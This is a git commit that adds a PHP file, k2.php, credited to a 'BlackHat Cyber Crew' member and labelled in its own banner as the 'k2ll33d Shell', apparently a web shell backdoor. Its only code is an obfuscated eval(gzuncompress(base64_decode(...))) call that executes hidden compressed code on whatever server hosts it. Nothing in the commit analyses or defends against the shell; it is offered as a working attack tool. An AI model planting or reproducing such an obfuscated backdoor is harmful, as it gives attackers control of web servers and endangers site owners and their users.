5c5255bd0f114b101e3c8668e9ec8f8fe1030024
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2018-05-29 12:43:28 +0200

    Add files via upload

---
+++ k2.php
@@ -0,0 +1,16 @@
+ 
+###     Tampilan	:	Update :)
+###     Created		:	JamvanHax0r ~ 18 January 2015
+###	Add/Follow	:	https://facebook.com/JamvanJr.Co.Id
+###	Like		:	https://facebook.com/BlackHat.Cyber.Crew
+                                ++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+<?php 
+/*
+##########################################
+##[ k2ll33d Shell ]  			##
+##[ R3c0d3d by JamvanHax0r ]  		##
+##[ BlackHat Cyber Crew ]  		##
+##########################################
+ */
+eval(gzuncompress(base64_decode("eJxT8UrMLUvM80isMChSsFVIy8xJjU9PLYlPzs8rSc0rKdZQzygpKbDS1y9ILC5JTcrM00vOz9UvSizXK8gosM+0dS0wzjIKiIhU17Tm5UotS8zRKC4pii/KLzE01kivysxLy0ksSUUSS0osTjUziU9JTc5PSdXQUEGyXhMMgMYAABBDMcU="))); ?>
